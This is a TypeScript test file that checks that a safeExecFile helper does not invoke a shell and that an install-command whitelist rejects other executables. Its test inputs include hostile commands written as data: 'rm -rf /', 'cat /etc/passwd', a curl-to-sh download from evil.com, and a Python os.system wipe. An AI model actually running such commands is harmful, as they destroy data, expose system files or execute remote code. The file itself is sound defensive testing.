import { describe, it, expect } from 'vitest';
import { safeExecFile } from '../../../src/utils/exec.js';

/**
 * Command injection security tests.
 *
 * These verify that safeExecFile (which uses execFile with shell: false)
 * cannot be exploited via shell metacharacters, command substitution,
 * pipe chains, or environment variable expansion — because no shell
 * interpreter is involved.
 */

describe('safeExecFile – shell injection prevention', () => {
  it('should treat shell metacharacters as literal arguments', async () => {
    // If a shell were invoked, "hello; rm -rf /" would execute two commands.
    // With execFile(shell:false), it's a single literal argument to echo.
    const result = await safeExecFile('echo', ['hello; rm -rf /']);
    expect(result.stdout.trim()).toBe('hello; rm -rf /');
  });

  it('should treat pipe operator as literal text', async () => {
    const result = await safeExecFile('echo', ['hello | cat /etc/passwd']);
    expect(result.stdout.trim()).toBe('hello | cat /etc/passwd');
  });

  it('should treat command substitution as literal text', async () => {
    const result = await safeExecFile('echo', ['$(whoami)']);
    expect(result.stdout.trim()).toBe('$(whoami)');
  });

  it('should treat backtick substitution as literal text', async () => {
    const result = await safeExecFile('echo', ['`whoami`']);
    expect(result.stdout.trim()).toBe('`whoami`');
  });

  it('should treat environment variable expansion as literal text', async () => {
    const result = await safeExecFile('echo', ['$HOME']);
    expect(result.stdout.trim()).toBe('$HOME');
  });

  it('should treat ampersand background operator as literal text', async () => {
    const result = await safeExecFile('echo', ['hello & echo injected']);
    expect(result.stdout.trim()).toBe('hello & echo injected');
  });

  it('should treat redirects as literal text', async () => {
    const result = await safeExecFile('echo', ['hello > /tmp/evil']);
    expect(result.stdout.trim()).toBe('hello > /tmp/evil');
  });

  it('should treat newline-separated commands as single argument', async () => {
    const result = await safeExecFile('echo', ['hello\nwhoami']);
    // echo outputs the literal string including the newline
    expect(result.stdout).toContain('hello');
    expect(result.stdout).toContain('whoami');
  });

  it('should pass arguments with special characters safely', async () => {
    const result = await safeExecFile('echo', ['"quotes"', "'singles'", '\\backslash']);
    expect(result.stdout).toContain('"quotes"');
    expect(result.stdout).toContain("'singles'");
    expect(result.stdout).toContain('\\backslash');
  });
});

describe('safeExecFile – install command whitelist', () => {
  // Re-implement the whitelist check from apply.ts for direct testing
  const ALLOWED_INSTALL_EXECUTABLES = new Set(['pnpm', 'npm', 'yarn', 'bun', 'npx']);

  function validateInstallCommand(cmd: string): { exe: string; args: string[] } {
    const parts = cmd.split(/\s+/).filter(Boolean);
    if (parts.length === 0) {
      throw new Error('Install command is empty');
    }
    const exe = parts[0];
    if (!ALLOWED_INSTALL_EXECUTABLES.has(exe)) {
      throw new Error(
        `Install command executable "${exe}" is not allowed. ` +
        `Allowed executables: ${[...ALLOWED_INSTALL_EXECUTABLES].join(', ')}`
      );
    }
    return { exe, args: parts.slice(1) };
  }

  it('should allow pnpm install', () => {
    const { exe, args } = validateInstallCommand('pnpm install --ignore-scripts');
    expect(exe).toBe('pnpm');
    expect(args).toEqual(['install', '--ignore-scripts']);
  });

  it('should allow npm install', () => {
    const { exe, args } = validateInstallCommand('npm install --ignore-scripts');
    expect(exe).toBe('npm');
    expect(args).toEqual(['install', '--ignore-scripts']);
  });

  it('should allow yarn install', () => {
    const { exe, args } = validateInstallCommand('yarn install --ignore-scripts');
    expect(exe).toBe('yarn');
    expect(args).toEqual(['install', '--ignore-scripts']);
  });

  it('should allow bun install', () => {
    const { exe } = validateInstallCommand('bun install');
    expect(exe).toBe('bun');
  });

  it('should reject arbitrary executables', () => {
    expect(() => validateInstallCommand('rm -rf /')).toThrow('not allowed');
    expect(() => validateInstallCommand('curl http://evil.com/script | sh')).toThrow('not allowed');
    expect(() => validateInstallCommand('bash -c "evil"')).toThrow('not allowed');
    expect(() => validateInstallCommand('python -c "import os; os.system(\'rm -rf /\')"')).toThrow('not allowed');
  });

  it('should reject empty command', () => {
    expect(() => validateInstallCommand('')).toThrow('empty');
    expect(() => validateInstallCommand('   ')).toThrow('empty');
  });

  it('should reject commands with path prefixes', () => {
    expect(() => validateInstallCommand('/usr/bin/pnpm install')).toThrow('not allowed');
    expect(() => validateInstallCommand('./node_modules/.bin/pnpm install')).toThrow('not allowed');
  });

  it('should reject commands disguised as allowed ones', () => {
    expect(() => validateInstallCommand('pnpm-evil install')).toThrow('not allowed');
    expect(() => validateInstallCommand('npx-custom install')).toThrow('not allowed');
  });
});

describe('safeExecFile – timeout and resource limits', () => {
  it('should enforce timeout on long-running commands', async () => {
    await expect(
      safeExecFile('sleep', ['60'], { timeout: 200 })
    ).rejects.toThrow();
  });

  it('should not pass shell: true', async () => {
    // Verify that attempting shell features fails (they are literal)
    // This is the definitive test: if shell were true, "echo hello && echo world"
    // would output two lines. With shell:false, echo gets "hello", "&&", "echo", "world"
    // as separate arguments.
    const result = await safeExecFile('echo', ['hello', '&&', 'echo', 'world']);
    expect(result.stdout.trim()).toBe('hello && echo world');
  });
});
